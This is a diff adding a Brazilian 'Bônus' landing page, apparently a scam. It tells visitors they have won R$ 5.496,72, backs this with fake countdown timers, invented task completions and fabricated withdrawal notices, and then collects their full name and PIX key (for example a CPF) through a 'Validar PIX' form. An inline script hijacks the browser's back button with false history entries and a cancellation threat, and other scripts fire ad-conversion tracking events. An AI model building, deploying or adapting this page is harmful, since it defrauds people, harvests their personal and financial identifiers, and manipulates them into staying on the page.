@@ -1,0 +1,493 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script src="js/utm-propagator.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bônus</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="css/boxicons.min.css" rel="stylesheet">
+    <script src="js/utm-propagator.js"></script>
+    
+<style>
+    .red {
+        color: green;
+    }
+
+    #overlay-modal {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.5);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+    }
+
+    .modal-box {
+        background: #f5f5f5;
+        width: 360px;
+        padding: 30px;
+        border-radius: 16px;
+        text-align: center;
+    }
+
+    #btn-finalizar {
+        width: 100%;
+        padding: 14px;
+        border: none;
+        border-radius: 10px;
+        background: #ff6a00;
+        color: white;
+        font-weight: bold;
+        cursor: pointer;
+        margin-top: 20px;
+    }
+
+    #btn-sair {
+        margin-top: 15px;
+        background: none;
+        border: none;
+        color: #777;
+        cursor: pointer;
+    }
+
+    /* Estilo Base e Esconder o Botão */
+    #btn-sacar-saldo-vsl {
+        display: none;
+        /* Começa escondido */
+        background-color: #ff8c00;
+        /* Laranja */
+        justify-self: center;
+        color: white;
+        border: none;
+        padding: 15px 30px;
+        font-size: 18px;
+        font-weight: bold;
+        border-radius: 8px;
+        cursor: pointer;
+        outline: none;
+        box-shadow: 0 0 0 0 rgba(255, 140, 0, 0.7);
+        animation: pulse 2s infinite;
+        /* Aplica o efeito pulse */
+        margin-top: 10px;
+        margin-bottom: 10px;
+    }
+
+    /* Animação Pulse */
+    @keyframes pulse {
+        0% {
+            transform: scale(0.95);
+            box-shadow: 0 0 0 0 rgba(255, 140, 0, 0.7);
+        }
+
+        70% {
+            transform: scale(1);
+            box-shadow: 0 0 0 15px rgba(255, 140, 0, 0);
+        }
+
+        100% {
+            transform: scale(0.95);
+            box-shadow: 0 0 0 0 rgba(255, 140, 0, 0);
+        }
+    }
+
+    .header-top {
+        width: 100%;
+        background-color: #ffffff;
+        box-shadow: 1px 1px 3px #0000003b;
+
+    }
+
+    .header-top img {
+        width: 25%;
+    }
+</style><script
+	src="https://cdn.xtracky.com/scripts/utm-handler.js"
+	data-token="abc60e07-8140-4133-b5df-23c871ba9de6"
+>
+</script>
+</head>
+
+
+<body>
+
+    <div id="modal-overlay" class="modal-overlay">
+        <div class="modal-content">
+            <img src="images/premio-img.png" alt="Icone" class="modal-icon">
+            <h2>Sua conta foi premiada</h2>
+            <p>Parabéns! Como parte de uma<br>campanha de recompensas exclusiva.</p>
+
+            <div class="valor-container">
+                R$ <span id="valor-dinheiro">5.496,72</span>
+            </div>
+
+            <div class="timer-container">
+                Expira em
+                <span class="time-box">00</span> :
+                <span class="time-box" id="minutos">13</span> :
+                <span class="time-box" id="segundos">06</span>
+            </div>
+
+            <button id="btn-fechar-modal" class="btn-sacar-modal">Sacar Agora</button>
+            <audio id="meu-audio">
+                <source src="media/audio.mp3" type="audio/mpeg">
+                Seu navegador não suporta o elemento de áudio.
+            </audio>
+        </div>
+    </div>
+
+    <header class="header-top">
+        <h1 class="logo-texto"><span>Bônus</span></h1>
+    </header>
+
+    <main class="main-container">
+
+        <div class="confetti c1"></div>
+        <div class="confetti c2"></div>
+        <div class="confetti c3"></div>
+        <div class="confetti c4"></div>
+
+        <div class="card card-saldo">
+            <div class="saldo-info">
+                <div class="label-saldo">Seu saldo <span class="status-dot"></span></div>
+                <h3>R$ 5.496,72</h3>
+            </div>
+            <button id="btn-sacar-saldo" class="btn-mini-sacar">Sacar</button>
+        </div>
+
+        <div class="card card-concluido">
+            <div class="concluido-texto">
+                <h4>Parabéns!<br>Você concluiu<br>todas as tarefas</h4>
+                <span class="valor-laranja">R$ 5.496,72</span>
+            </div>
+            <img src="images/parabens-img-DyKL61G2.png" alt="Bônus" class="icon-calendar">
+        </div>
+
+        <div class="alerta-expira">
+            <i class="bx bx-time-five"></i>
+            <p>Seu saldo expira em <span id="timer-alerta">00:11:37</span>. Saque agora para não perder.</p>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">Check-in diário — 14 dias</p>
+                    <p class="pontos-laranja" style="margin-top: 4px;">8.414 pontos</p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Concluído</div>
+            </div>
+            <div class="task-completed-box">
+                <i class="bx bx-check"></i> 14/14 dias concluídos
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-show"></i></span> Veja anúncios direcionados
+                    </p>
+                    <p class="tarefa-sub">diariamente para ganhar até <span class="pontos-laranja">2.730 pontos</span>
+                    </p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Concluído</div>
+            </div>
+            <div class="progress-row">
+                <div class="progress-bar-bg">
+                    <div class="progress-fill" style="width: 100%;"></div>
+                </div>
+                <span class="progress-text">30/30</span>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-play"></i></span> Assistir vídeos
+                    </p>
+                    <p class="tarefa-sub">10 min assistidos — <span class="pontos-laranja">500 pontos</span></p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Concluído</div>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-gift"></i></span> Resgate suas recompensas
+                    </p>
+                    <p class="tarefa-sub">e ganhe <span class="pontos-laranja">640 pontos</span></p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Concluído</div>
+            </div>
+            <div class="progress-row">
+                <div class="progress-bar-bg">
+                    <div class="progress-fill fill-green" style="width: 100%;"></div>
+                </div>
+                <span class="progress-text">8/8</span>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-calendar-star"></i></span> Pesquisas diárias
+                    </p>
+                    <p class="tarefa-sub">60 pesquisas concluídas — <span class="pontos-laranja">996 pontos</span></p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Concluído</div>
+            </div>
+            <div class="progress-row">
+                <div class="progress-bar-bg">
+                    <div class="progress-fill" style="width: 100%;"></div>
+                </div>
+                <span class="progress-text">60/60</span>
+            </div>
+        </div>
+
+        <div class="card card-tarefa">
+            <div class="tarefa-top">
+                <div class="tarefa-info">
+                    <p class="tarefa-titulo">
+                        <span class="orange-icon"><i class="bx bx-group"></i></span> Convide amigos
+                    </p>
+                    <p class="tarefa-sub">1 amigo para ganhar <span class="pontos-laranja">100.000 – 200.000
+                            pontos</span></p>
+                </div>
+                <div class="badge-concluido"><i class="bx bx-check"></i> Concluído</div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer-fixo">
+        <button id="btn-sacar-footer" class="btn-pix">
+            <span class="icon-money">💰</span> Sacar R$ 5.496,72 — Via PIX <i class="bx bx-chevron-right"></i>
+        </button>
+        <p class="seguranca">
+            <i class="bx bx-check-shield" style="color: #00c853;"></i> Pagamento 100% seguro • 2.809 saques hoje
+        </p>
+    </footer>
+    <div id="toast-saque" class="toast-saque">
+        <img id="toast-img" src="https://i.pravatar.cc/150?img=11" alt="Perfil" class="toast-perfil">
+        <div class="toast-texto">
+            <p id="toast-mensagem">Pedro H. sacou <strong class="texto-verde">R$ 2.029,02</strong></p>
+            <span>há poucos segundos</span>
+        </div>
+        <div class="toast-dot"></div>
+    </div>
+    <div id="modal-pix" class="modal-overlay" style="display: none;">
+        <div class="modal-content modal-pix-content">
+            <i class="bx bx-x close-modal-pix" id="fechar-pix"></i>
+
+            <h2 class="pix-title">Sacar dinheiro</h2>
+
+            <div class="pix-subtitle">
+                <i class="bx bx-credit-card-front"></i> Validação da Chave Pix <span class="divisor">/</span> <span class="status-dot"></span> <strong>PIX</strong>
+            </div>
+
+            <div class="input-group">
+                <label>NOME COMPLETO</label>
+                <input type="text" id="pix-nome" placeholder="Ex: João da Silva">
+            </div>
+
+            <div class="input-group">
+                <label>TIPO DE CHAVE PIX</label>
+                <div class="pix-types">
+                    <button type="button" class="btn-pix-type active" data-type="CPF">CPF</button>
+                    <button type="button" class="btn-pix-type" data-type="E-mail">E-mail</button>
+                    <button type="button" class="btn-pix-type" data-type="Celular">Celular</button>
+                    <button type="button" class="btn-pix-type" data-type="Chave Aleatória">Chave Aleatória</button>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>SUA CHAVE PIX</label>
+                <div class="input-wrapper">
+                    <input type="text" id="pix-chave" placeholder="000.000.000-00">
+                    <i id="input-icon" class="bx" style="display: none;"></i>
+                </div>
+            </div>
+
+            <div id="status-box" class="status-box" style="display: none;">
+                <i id="status-icon" class="bx"></i>
+                <div class="status-texts">
+                    <strong id="status-title"></strong>
+                    <span id="status-desc"></span>
+                </div>
+            </div>
+
+            <button id="btn-validar-pix" class="btn-validar">Validar PIX</button>
+            <p class="pix-footer-text" id="pix-footer-text">Vamos validar sua chave Pix para a retirada do seu saldo.
+            </p>
+        </div>
+    </div>
+
+    <button id="btn-validar-pix" class="btn-validar">Validar PIX</button>
+    <p class="pix-footer-text">Vamos validar sua chave Pix para a retirada do seu saldo.</p>
+    
+    
+    <div id="overlay-modal" style="display:none;">
+        <div class="modal-box">
+            <h1 style="text-align: center; color: red ;"><i class="bx bxs-error"></i></h1>
+            <h2>Sua Recompensa de <br> <span class="red">R$ 5.496,72</span> já está reservada para você, esperando sua
+                chave Pix ser confirmada, para sacar seu dinheiro
+            </h2>
+            <p>Se sair agora, o sistema cancela sua Recompensa automáticamente.</p>
+
+            <button id="btn-finalizar">SACAR RECOMPENSA 💰</button>
+            <button id="btn-sair">Sair mesmo assim</button>
+        </div>
+    </div>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+
+            // cria estado falso no histórico
+            history.pushState(null, null, location.href);
+
+            // quando tentar voltar
+            window.addEventListener("popstate", function () {
+                history.pushState(null, null, location.href);
+                document.getElementById("overlay-modal").style.display = "flex";
+            });
+
+            // botão finalizar → só fecha modal
+            document.getElementById("btn-finalizar").addEventListener("click", function () {
+                document.getElementById("overlay-modal").style.display = "none";
+            });
+
+            // botão sair mesmo assim → permite voltar
+            document.getElementById("btn-sair").addEventListener("click", function () {
+                window.removeEventListener("popstate", arguments.callee);
+                history.back();
+            });
+
+        });
+    </script>
+    <script>
+        (function () {
+            // 1. Funções de Persistência
+            function getParam(name) {
+                try { return new URL(window.location.href).searchParams.get(name); }
+                catch (e) { return null; }
+            }
+
+            function setCookie(name, value, days) {
+                var d = new Date();
+                d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+                document.cookie = name + "=" + encodeURIComponent(value) + ";expires=" + d.toUTCString() + ";path=/;SameSite=Lax";
+            }
+
+            // 2. CAPTURA E SALVAMENTO (Crucial para a primeira página)
+            // Busca na URL (click_id ou clickid)
+            var clickid = (getParam('click_id') || getParam('clickid') || '').trim();
+
+            if (clickid) {
+                // Se encontrou na URL, salva/atualiza em todo lugar
+                localStorage.setItem('click_id', clickid);
+                localStorage.setItem('clickid', clickid); // Salva as duas variações por segurança
+                setCookie('click_id', clickid, 7);
+                console.log("Click ID capturado e salvo:", clickid);
+            } else {
+                // Se não tem na URL, tenta recuperar o que já estava salvo (caso seja um retorno)
+                clickid = (localStorage.getItem('click_id') || '').trim();
+            }
+
+            // CAPTURA UTM_SOURCE
+            var utm_source = (getParam('utm_source') || '').trim();
+            if (utm_source) {
+                localStorage.setItem('utm_source', utm_source);
+                setCookie('utm_source', utm_source, 7);
+                console.log("UTM Source capturado e salvo:", utm_source);
+            } else {
+                utm_source = (localStorage.getItem('utm_source') || '').trim();
+            }
+
+            // Se após tentar capturar e recuperar ainda não tiver ID, encerra para não enviar lixo
+            if (!clickid) return;
+
+            // 3. EVENTO: CONTENT VIEW (Dispara ao carregar)
+            (function fireContentView() {
+                var firedKey = 'kwai_cv_primeira_pagina';
+                if (sessionStorage.getItem(firedKey) === '1') return;
+                sessionStorage.setItem(firedKey, '1');
+
+                    fetch('/api/kwai-event', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        clickid: clickid,
+                        event_name: 'EVENT_CONTENT_VIEW',
+                        currency: 'BRL',
+                        value: 19.83,
+                        order_id: ''
+                    }),
+                    keepalive: true
+                });
+            })();
+
+            // 4. EVENTO: ADD TO CART (No clique do botão Validar PIX)
+            // Note que existem dois IDs no seu HTML (um dentro e outro fora do modal), 
+            // vamos garantir que pegue o que o usuário clicar.
+            document.addEventListener('click', function (e) {
+                if (e.target && e.target.id === 'btn-validar-pix') {
+                    var firedCartKey = 'kwai_atc_validar_pix';
+
+                    // Anti-duplicação por clique
+                    if (sessionStorage.getItem(firedCartKey) === '1') return;
+                    sessionStorage.setItem(firedCartKey, '1');
+
+                    fetch('/api/kwai-event', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            clickid: clickid,
+                            event_name: 'EVENT_ADD_TO_CART',
+                            currency: 'BRL',
+                            value: 19.83,
+                            order_id: ''
+                        }),
+                        keepalive: true
+                    });
+                    console.log("Evento AddToCart disparado via Validar PIX.");
+                }
+            });
+        })();
+    </script>
+    <script src="js/confetti.browser.min.js"></script>
+    <script src="js/index_1.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+
+            // Lógica do Vídeo com Máscara
+            const video = document.getElementById("localVideo");
+            const container = document.getElementById("videoContainer");
+            const overlay = document.getElementById("videoOverlay");
+
+            container.addEventListener("click", function () {
+                video.muted = false; // Ativa o som
+                video.currentTime = 0; // Reinicia o vídeo
+                video.play();
+                overlay.style.display = "none"; // Remove a máscara
+            });
+        });
+    </script>
+    <script>
+        setTimeout(function () {
+            const botao = document.getElementById('btn-sacar-saldo-vsl');
+            if (botao) {
+                botao.style.display = 'block'; // Ou 'inline-block' dependendo do seu layout
+            }
+        }, 100000); // 1:40 min = 100.000ms
+    </script>
+
+    
+<!-- Cole antes do </body> na sua landing page -->
+<script src="js/index.js" data-token="pt_246f25ea85305e5f3c653da1bc55dfd7"></script>
+        
+        <!-- Cole antes do </body> na sua landing page -->
+<script src="js/index.js" data-token="pt_d7c144ffd2b0fce2c05f769269023150"></script>
+
+
+</body></html>
